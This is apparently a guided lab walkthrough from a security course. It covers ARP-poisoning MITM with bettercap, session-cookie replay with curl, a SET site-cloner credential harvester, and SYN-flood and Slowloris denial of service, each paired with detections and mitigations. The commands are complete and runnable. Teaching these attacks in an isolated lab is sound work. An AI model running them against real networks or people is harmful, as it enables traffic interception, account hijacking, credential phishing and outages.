---
session: 9
title: Sniffing/MITM/Hijacking/Social Eng/DoS — Guided Lab Walkthrough
---

# Session 9 — Guided Lab Walkthrough

> Isolated host-only lab only. Stop ARP spoofing cleanly; phishing/DoS on consenting lab targets only.

## Lab A — ARP poison + sniff (bettercap)
```bash
sudo bettercap -iface eth0
> net.probe on ; net.show                     # find victim + gateway
> set arp.spoof.targets 192.168.56.10         # the victim
> arp.spoof on ; net.sniff on                 # MITM + capture
# Wireshark filter for the cleartext login:
#   http.request and (frame contains "pass" or frame contains "user")
> arp.spoof off                               # ALWAYS restore mappings
# defender: on the victim, `arp -a` shows the gateway IP now = attacker MAC
```

## Lab B — Steal & replay a session cookie
```bash
# obtain the cookie from Lab A's capture (Cookie: PHPSESSID=...) or S8 XSS
curl -b 'PHPSESSID=abc123...' http://APP/account     # served the victim's session
# or set it in the browser dev-tools and reload
# detector: one session ID from two IPs at once = hijack
```

## Lab C — SET credential harvester (ETHICS-GATED, lab only)
```bash
sudo setoolkit
# 1) Social-Engineering Attacks -> 2) Website Attack Vectors
# -> 3) Credential Harvester -> 2) Site Cloner
# POST-back IP = your Kali; clone a LAB login page (never a real brand)
# 'victim' browses to the clone, submits a TEST credential -> SET logs it
# defender: young/look-alike domain, new-geo login, MFA defeats the harvested password
```

## Lab D — Controlled DoS
```bash
# SYN flood (protocol):
sudo hping3 -S --flood -p 80 192.168.56.20
ss -tan state syn-recv | wc -l                # on target: climbs
sudo sysctl -w net.ipv4.tcp_syncookies=1      # mitigation -> recovers
# Slowloris (app-layer):
slowhttptest -c 500 -H -i 10 -r 200 -u http://192.168.56.20/
# mitigation: reverse proxy / mod_reqtimeout (header timeouts)
```

## Lab E — Detect + assessment report
```bash
# validate detections against your own attack traffic:
#   Lab A -> arpwatch/Suricata ARP-spoof alert
#   Lab B -> session-token-from-two-IPs correlation
#   Lab D -> ss -tan state syn-recv | wc -l  threshold
```
Then fill `exercises/session-09/assessment_report_template.md`: one section per surface (network/session/human/availability) — finding, evidence, fix — prioritised, with detections attached.
